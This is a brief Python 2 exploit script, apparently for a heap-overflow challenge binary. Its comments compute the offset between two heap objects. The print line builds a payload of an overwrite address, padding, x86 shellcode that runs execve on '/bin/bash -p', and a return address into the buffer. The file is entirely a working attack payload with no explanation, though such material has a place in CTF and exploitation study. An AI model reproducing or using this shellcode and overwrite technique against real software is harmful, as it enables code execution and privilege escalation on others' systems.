
# 0x804a008 - addr of n1
# 0x804a078 - addr of n2
# 0x804a078 - 0x804a008 = 112 bytes

# n1' buffer starts on 0x804a008 + 4 = 0x804a00c

# 4 + 20 + 33 + 51 + 4 overwrite addr = 112 bytes total
print "\x08\x04\xa0\x24"[::-1] + "X" * 20 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "X" * 51 + "\x08\x04\xa0\x0c"[::-1]